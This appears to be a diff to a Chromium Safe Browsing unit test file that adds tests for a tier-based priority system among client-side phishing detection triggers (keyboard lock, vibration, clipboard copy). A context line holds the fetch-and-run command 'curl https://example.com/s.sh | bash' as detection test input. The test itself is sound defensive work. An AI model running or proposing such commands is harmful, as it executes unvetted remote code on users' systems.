@@ -16,6 +16,7 @@
 #include "base/memory/ref_counted.h"
 #include "base/metrics/statistics_recorder.h"
 #include "base/run_loop.h"
+#include "base/strings/string_number_conversions.h"
 #include "base/synchronization/waitable_event.h"
 #include "base/test/bind.h"
 #include "base/test/gmock_callback_support.h"
@@ -5500,6 +5501,159 @@ TEST_F(ClientSideDetectionHostClipboardDataTest, ExcludeFullPayloadByDefault) {
       ExtractFromPayload(u"curl https://example.com/s.sh | bash");
   EXPECT_TRUE(data.is_overall_suspicious());
   EXPECT_FALSE(data.has_content());
+}
+
+class ClientSideDetectionHostPriorityTest
+    : public ClientSideDetectionHostTestBase {
+ public:
+  ClientSideDetectionHostPriorityTest()
+      : ClientSideDetectionHostTestBase(false /*is_incognito*/) {}
+
+  void SetUp() override {
+    feature_list_.InitAndEnableFeature(kClientSideDetectionTierSystem);
+    ClientSideDetectionHostTestBase::SetUp();
+    url_ = GURL("https://example.com");
+    database_manager_->SetAllowlistLookupDetailsForUrl(url_, false);
+
+    SetEnhancedProtectionPrefForTests(profile()->GetPrefs(), true);
+
+    Mock::VerifyAndClearExpectations(csd_service_.get());
+    Mock::VerifyAndClearExpectations(database_manager_.get());
+
+    EXPECT_CALL(*csd_service_, IsLocalResource(_))
+        .Times(testing::AnyNumber())
+        .WillRepeatedly(Return(false));
+    EXPECT_CALL(*csd_service_, IsPrivateIPAddress(_))
+        .Times(testing::AnyNumber())
+        .WillRepeatedly(Return(false));
+    EXPECT_CALL(*csd_service_, AtPhishingReportLimit())
+        .Times(testing::AnyNumber())
+        .WillRepeatedly(Return(false));
+    EXPECT_CALL(*database_manager_.get(), CanCheckUrl(_))
+        .Times(testing::AnyNumber())
+        .WillRepeatedly(Return(true));
+    EXPECT_CALL(*database_manager_.get(), CheckCsdAllowlistUrl(url_, _))
+        .Times(testing::AnyNumber())
+        .WillRepeatedly(Return(AsyncMatch::NO_MATCH));
+  }
+
+ protected:
+  GURL url_;
+  base::HistogramTester histogram_tester_;
+};
+
+TEST_F(ClientSideDetectionHostPriorityTest,
+       HighPriorityTriggerCancelsLowPriority) {
+  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
+    GTEST_SKIP();
+  }
+
+  // 1. Start a Tier 3 trigger (TRIGGER_MODELS) via navigation.
+  NavigateAndCommit(url_);
+
+  // 2. Start a Tier 1 trigger (KEYBOARD_LOCK_REQUESTED) via
+  // WebContentsObserver. This should cancel TRIGGER_MODELS if it's still
+  // running.
+  csd_host_->KeyboardLockRequested();
+
+  // The CancelActor metric should be logged.
+  histogram_tester_.ExpectBucketCount(
+      "SBClientPhishing.PreClassificationCheckCancelActor.TriggerModel",
+      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED, 1);
+}
+
+TEST_F(ClientSideDetectionHostPriorityTest,
+       LowPriorityTriggerBlockedByHighPriority) {
+  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
+    GTEST_SKIP();
+  }
+
+  // Let navigation finish first so it doesn't overlap.
+  NavigateAndCommit(url_);
+  base::RunLoop().RunUntilIdle();
+
+  // Now start Tier 1 (KEYBOARD_LOCK_REQUESTED) via WebContentsObserver.
+  csd_host_->KeyboardLockRequested();
+
+  // 2. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
+  // KEYBOARD_LOCK_REQUESTED (Tier 1) should block VIBRATION_API (Tier 2).
+  csd_host_->VibrationRequested();
+
+  // Verification: VIBRATION_API should be blocked.
+  histogram_tester_.ExpectBucketCount(
+      "SBClientPhishing.BlockingRequestType.VibrationApi",
+      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED, 1);
+}
+
+TEST_F(ClientSideDetectionHostPriorityTest, SameTierTriggerBlocked) {
+  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
+    GTEST_SKIP();
+  }
+
+  // Let navigation finish first.
+  NavigateAndCommit(url_);
+  base::RunLoop().RunUntilIdle();
+
+  // 2. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
+  csd_host_->VibrationRequested();
+
+  // 3. Start another Tier 2 trigger (CLIPBOARD_COPY_API) via
+  // WebContentsObserver. VIBRATION_API should block CLIPBOARD_COPY_API because
+  // they are same tier.
+  std::u16string copied_text =
+      u"This string is definitely long enough to pass the length checks for "
+      u"the clipboard copy API trigger. We need this string to be quite long "
+      u"indeed to pass the minimum threshold.";
+  csd_host_->OnTextCopiedToClipboard(web_contents()->GetPrimaryMainFrame(),
+                                     copied_text);
+
+  // Verification: CLIPBOARD_COPY_API should be blocked.
+  histogram_tester_.ExpectBucketCount(
+      "SBClientPhishing.BlockingRequestType.ClipboardCopyApi",
+      ClientSideDetectionType::VIBRATION_API, 1);
+}
+
+TEST_F(ClientSideDetectionHostPriorityTest, BypassTiers) {
+  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
+    GTEST_SKIP();
+  }
+
+  // Enable the bypass feature and set the bypass list to include
+  // CLIPBOARD_COPY_API
+  std::string bypass_list = base::NumberToString(
+      static_cast<int>(ClientSideDetectionType::CLIPBOARD_COPY_API));
+  feature_list_.Reset();
+  feature_list_.InitWithFeaturesAndParameters(
+      {{kClientSideDetectionBypassTiers,
+        {{kClientSideDetectionBypassTiersList.name, bypass_list}}},
+       {kClientSideDetectionTierSystem, {}}},
+      {});
+
+  // Let navigation finish first.
+  NavigateAndCommit(url_);
+  base::RunLoop().RunUntilIdle();
+
+  // 1. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
+  csd_host_->VibrationRequested();
+
+  // 2. Start another Tier 2 trigger (CLIPBOARD_COPY_API) via
+  // WebContentsObserver. VIBRATION_API should normally block CLIPBOARD_COPY_API
+  // because they are same tier, but it's in the bypass list.
+  std::u16string copied_text =
+      u"This string is definitely long enough to pass the length checks for "
+      u"the clipboard copy API trigger. We need this string to be quite long "
+      u"indeed to pass the minimum threshold.";
+  csd_host_->OnTextCopiedToClipboard(web_contents()->GetPrimaryMainFrame(),
+                                     copied_text);
+
+  // Verification: CLIPBOARD_COPY_API should NOT be blocked and cancels
+  // VIBRATION_API.
+  histogram_tester_.ExpectBucketCount(
+      "SBClientPhishing.PreClassificationCheckCancelActor.VibrationApi",
+      ClientSideDetectionType::CLIPBOARD_COPY_API, 1);
+  histogram_tester_.ExpectBucketCount(
+      "SBClientPhishing.BlockingRequestType.ClipboardCopyApi",
+      ClientSideDetectionType::VIBRATION_API, 0);
 }
 
 }  // namespace safe_browsing
